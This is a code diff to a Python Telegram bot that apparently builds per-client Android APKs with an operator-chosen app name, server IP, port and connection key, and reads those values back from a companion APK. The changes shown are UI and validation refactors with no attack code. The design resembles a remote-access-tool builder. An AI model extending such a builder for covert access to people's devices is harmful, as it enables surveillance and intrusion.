@@ -353,13 +353,16 @@ def read_companion_server_config() -> dict:
                     dec = base64.b64decode(raw + b"==").decode("ascii")
                 except Exception:
                     continue
+                # Key must be alphanumeric-only (no punctuation, commas, dots)
+                # At least 3 chars, all chars in [A-Za-z0-9]
+                _alnum_only = _re.match(r'^[A-Za-z0-9]+$', dec)
                 if (not found_key
                         and 3 <= len(dec) <= 32
-                        and dec.isprintable()
+                        and _alnum_only
                         and not dec.isdigit()
                         and not _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', dec)
                         and not _re.match(r'^[A-Z_]{3,}$', dec)   # skip Android constants
-                        and "/" not in dec and "\\" not in dec):
+                        ):
                     found_key     = dec
                     found_key_b64 = raw.decode()
 
@@ -1771,20 +1774,24 @@ def kb_custom_cancel(client_id: int) -> types.InlineKeyboardMarkup:
 
 # ── Server config helpers (IP / Port / Key) ─────────────────────────────────
 
-def text_server_ip_prompt(client_id: int, template: str) -> str:
+def text_server_ip_prompt(client_id: int, template: str,
+                          cfg: dict = None) -> str:
+    """Screen 1: show current companion values + ask for new IP.
+    cfg is from read_companion_server_config(); pass it in to avoid re-reading.
+    """
     db = get_db()
     c  = db.execute(
         "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
     db.close()
     name = c["profile_name"] or c["telegram_username"] if c else "Unknown"
     emoji, tpl_name = TEMPLATES.get(template, ("⚙️", template.title()))
-    # Auto-detect current values from companion APK
-    cfg = read_companion_server_config()
+    if cfg is None:
+        cfg = read_companion_server_config()
     if cfg["ip"] or cfg["port"] or cfg["key"]:
         current_line = (
             "━━━━━━━━━━━━━━━━━━━━\n"
             "📌 <b>Current in companion:</b>\n"
-            f"   📡 IP   : <code>{cfg['ip']  or '—'}</code>\n"
+            f"   📡 IP   : <code>{cfg['ip']   or '—'}</code>\n"
             f"   🔌 Port : <code>{cfg['port'] or '—'}</code>\n"
             f"   🔑 Key  : <code>{cfg['key']  or '—'}</code>\n"
         )
@@ -1801,11 +1808,13 @@ def text_server_ip_prompt(client_id: int, template: str) -> str:
     )
 
 
-def text_server_port_prompt(ip: str) -> str:
-    cfg = read_companion_server_config()
-    current_line = (
-        f"<i>Current: <code>{cfg['port'] or '—'}</code></i>\n\n"
-        if cfg["port"] else ""
+def text_server_port_prompt(ip: str, cfg: dict = None) -> str:
+    """Screen 2: show entered IP + hint of current port."""
+    if cfg is None:
+        cfg = read_companion_server_config()
+    current_hint = (
+        f"<i>Current: <code>{cfg['port']}</code></i>\n\n"
+        if cfg.get("port") else ""
     )
     return (
         "🌐 <b>Server Config</b>\n"
@@ -1813,16 +1822,18 @@ def text_server_port_prompt(ip: str) -> str:
         f"📡 IP   : <code>{ip}</code>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         "🔌 Enter server port:\n\n"
-        + current_line +
+        + current_hint +
         "<i>Example: 7771</i>"
     )
 
 
-def text_server_key_prompt(ip: str, port: str) -> str:
-    cfg = read_companion_server_config()
-    current_line = (
-        f"<i>Current: <code>{cfg['key'] or '—'}</code></i>\n\n"
-        if cfg["key"] else ""
+def text_server_key_prompt(ip: str, port: str, cfg: dict = None) -> str:
+    """Screen 3: show entered IP+port + hint of current key."""
+    if cfg is None:
+        cfg = read_companion_server_config()
+    current_hint = (
+        f"<i>Current: <code>{cfg['key']}</code></i>\n\n"
+        if cfg.get("key") else ""
     )
     return (
         "🌐 <b>Server Config</b>\n"
@@ -1831,7 +1842,7 @@ def text_server_key_prompt(ip: str, port: str) -> str:
         f"🔌 Port : <code>{port}</code>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         "🔑 Enter connection key:\n\n"
-        + current_line +
+        + current_hint +
         "<i>Example: MySecretKey123</i>"
     )
 
@@ -3229,11 +3240,15 @@ def handle_server_config_ip(message):
                   text_server_ip_prompt(buf["client_id"], buf["template"]),
                   kb_server_config_cancel(buf["client_id"], buf["template"]))
         return
+    # Cache companion config once here — reused by port/key prompts and confirm
+    if "_companion_cfg" not in buf:
+        buf["_companion_cfg"] = read_companion_server_config()
+    _cfg = buf["_companion_cfg"]
     buf["ip"]   = ip
     buf["step"] = "port"
     server_config_buf[chat_id] = buf
     safe_edit(message.chat.id, msg_id,
-              text_server_port_prompt(ip),
+              text_server_port_prompt(ip, cfg=_cfg),
               kb_server_config_cancel(buf["client_id"], buf["template"]))
 
 
@@ -3252,17 +3267,18 @@ def handle_server_config_port(message):
         bot.delete_message(message.chat.id, message.message_id)
     except Exception:
         pass
+    _cfg = buf.get("_companion_cfg")  # cached from IP step
     port = message.text.strip()
     if not port:
         safe_edit(message.chat.id, msg_id,
-                  text_server_port_prompt(buf["ip"]),
+                  text_server_port_prompt(buf["ip"], cfg=_cfg),
                   kb_server_config_cancel(buf["client_id"], buf["template"]))
         return
     buf["port"] = port
     buf["step"] = "key"
     server_config_buf[chat_id] = buf
     safe_edit(message.chat.id, msg_id,
-              text_server_key_prompt(buf["ip"], port),
+              text_server_key_prompt(buf["ip"], port, cfg=_cfg),
               kb_server_config_cancel(buf["client_id"], buf["template"]))
 
 
@@ -3281,63 +3297,76 @@ def handle_server_config_key(message):
         bot.delete_message(message.chat.id, message.message_id)
     except Exception:
         pass
+    _cfg = buf.get("_companion_cfg")  # cached from IP step; fallback below
     key = message.text.strip()
     if not key:
         safe_edit(message.chat.id, msg_id,
-                  text_server_key_prompt(buf["ip"], buf["port"]),
+                  text_server_key_prompt(buf["ip"], buf["port"], cfg=_cfg),
                   kb_server_config_cancel(buf["client_id"], buf["template"]))
         return
     buf["key"]  = key
     buf["step"] = "done"
     server_config_buf[chat_id] = buf
-    # Read current companion values for before→after diff
-    _cfg = read_companion_server_config()
+    # Use cached companion values for before→after diff (avoid re-reading APK)
+    if _cfg is None:
+        _cfg = read_companion_server_config()
     _old_ip   = _cfg["ip"]   or "—"
     _old_port = _cfg["port"] or "—"
     _old_key  = _cfg["key"]  or "—"
     _new_ip   = buf["ip"]
     _new_port = buf["port"]
     _new_key  = buf["key"]
+
     def _diff(old, new):
-        return f"<code>{new}</code>" if old == new else f"<s>{old}</s> → <code>{new}</code>"
+        # Fix 1: use <del> (Telegram HTML), not <s> (unsupported)
+        # Fix 2: show (unchanged) label instead of bare code when same
+        if old == new:
+            return f"<code>{new}</code> (unchanged)"
+        return f"<del>{old}</del> → <code>{new}</code>"
+
+    # Fix 3: diff block is BEFORE build summary — assembled here, prepended below
     _diff_block = (
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "🔄 <b>Config Update Preview:</b>\n"
+        "🔄 <b>Config Update:</b>\n"
         f"   📡 IP   : {_diff(_old_ip,   _new_ip)}\n"
         f"   🔌 Port : {_diff(_old_port, _new_port)}\n"
         f"   🔑 Key  : {_diff(_old_key,  _new_key)}\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
     )
+
     # Show confirmation screen
     template   = buf["template"]
     client_id  = buf["client_id"]
     is_rebuild = buf.get("is_rebuild", False)
     cbuf       = custom_build_buf.get(chat_id)
     if template == "custom" and cbuf:
+        # Fix 3: diff block before build summary
+        # Fix 4: text_custom_build_confirm already ends with "Everything correct?"
+        #         — do NOT append it again
+        # Fix 5: no extra ━ separator between diff block and build summary
         safe_edit(message.chat.id, msg_id,
-                  text_custom_build_confirm(
+                  _diff_block
+                  + text_custom_build_confirm(
                       client_id, cbuf["app_name"],
                       srv_ip=_new_ip, srv_port=_new_port,
-                      srv_key=_new_key)
-                  + "\n" + _diff_block
-                  + "━━━━━━━━━━━━━━━━━━━━\n"
-                    "Everything correct?",
+                      srv_key=_new_key),
                   kb_build_confirm(client_id, template))
     elif is_rebuild:
         safe_edit(message.chat.id, msg_id,
                   f"🔁 <b>Rebuild — confirm config</b>\n"
-                  + _diff_block +
                   "━━━━━━━━━━━━━━━━━━━━\n"
+                  + _diff_block +
                   "Confirm to rebuild with this config:",
                   kb_rebuild_confirm(client_id, template))
     else:
+        # Fix 3: diff block before build summary
+        # Fix 4: text_build_confirm already ends with "Everything correct?" — no duplicate
+        # Fix 5: no extra ━ separator
         safe_edit(message.chat.id, msg_id,
-                  text_build_confirm(
+                  _diff_block
+                  + text_build_confirm(
                       client_id, template,
                       srv_ip=_new_ip, srv_port=_new_port,
-                      srv_key=_new_key)
-                  + "\n" + _diff_block
-                  + "━━━━━━━━━━━━━━━━━━━━\n"
-                    "Everything correct?",
+                      srv_key=_new_key),
                   kb_build_confirm(client_id, template))
 
 
